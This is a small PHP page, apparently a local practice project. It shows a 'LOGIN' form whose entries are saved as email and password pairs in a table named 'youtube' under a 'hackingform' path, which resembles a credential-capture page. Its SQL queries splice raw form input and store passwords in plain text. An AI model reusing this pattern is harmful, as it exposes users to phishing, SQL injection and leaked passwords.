<?php require 'component/_connection.php'?>

<?php

if($_SERVER['REQUEST_METHOD'] == 'POST'){
 $gmail = $_POST['email'];
 $pass = $_POST['password'];
 

 $sqli2 = "SELECT * FROM `youtube` WHERE `gmail` LIKE '$gmail'";
 $result2 = mysqli_query($conn , $sqli2);
 $row = mysqli_num_rows($result2);

 if($row > 0){
 echo "username already exists" ;
 }else {
 $sql = "INSERT INTO `youtube` (`gmail`, `password`) VALUES ( '$gmail', '$pass');";
 $result = mysqli_query($conn , $sql);

 if($result){
   echo "inserted succesfully";
 }else{
   echo "some error in the code";
 }

 }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIGN UP FORM</title>
</head>


<body>

<style>
  *{
    padding:0px;
    margin:0px;
  }
 
 .container{
   border-radius:23px;
   border:1px solid black;
   justify-content:center;
   margin:0 auto;
   width:400px;
   height:400px;
   margin-top:100px;
   transition: 0.2s ease-in-out;
 }

 .container:hover{
   border:1px solid black;
   justify-content:center;
   margin:0 auto;
   width:410px;
   height:410px;
   margin-top:100px;
   box-shadow: 6px 9px 0px 0px rgba(90,90,90,0.99);
   -webkit-box-shadow: 6px 9px 0px 0px rgba(90,90,90,0.99);
   -moz-box-shadow: 6px 9px 0px 0px rgba(90,90,90,0.99);
 }


  .form{
  margin:0 auto;
  justify-content:center;
  text-align:center;
 }

 .useremail{
  position: relative;
  margin: 0 auto;
 }

 .user{
  display: block;
  margin:0 auto;
  justify-content:center;
  text-align:center;
  padding:22px;
 }

 .gmail{
  display: block;
  margin:0 auto;
  justify-content:center;
  text-align:center;
 }

 .login{
  display: block;
  margin:0 auto;
  justify-content:center;
  text-align:center;
 }

 input#email {
    padding: 10px;
    border-left: none;
    border-right: none;
    border-top: none;
    text-align: center;
 }

  input#password {
    padding: 10px;
    border-left: none;
    border-right: none;
    border-top: none;
    text-align: center;
 }

  button.login {
    border-radius:33px;
    padding: 8px 31px;
    background-color: grey;
    color: white;
    transition: 0.2s ease-in-out;
 }

 button.login:hover{
    padding: 10px 40px;
    background-color:black;
    color: white;
    box-shadow: 0 10px 10px -5px;
 }

 label.gmail {
    margin-top: 27px;
 }


 .user {
    margin-top: 19px;
 }


 h3 {
    TEXT-ALIGN: CENTER;
    PADDING: 20PX;
    BORDER: 1PX SOLID BLACK;
    BACKGROUND-COLOR: BLACK;
    COLOR: WHITE;
    border-top-right-radius: 22px;
    border-top-left-radius: 22px;
 }



</style>



   <div class="container">
     <form action="http://localhost/shubham/hackingform/youtube.php?" method="post">
     <h3>LOGIN</h3>
      <div class="user">
            <input type="email" class="input1" placeholder="gmail"  id="email" name="email">
        </div>
      <div class="user"> 
            <input type="password" class="input1" placeholder="password"  id="password" name="password">
        </div>
      <button type="submit" class="login">login</button>
     </form>
   </div>


   

</body>
</html>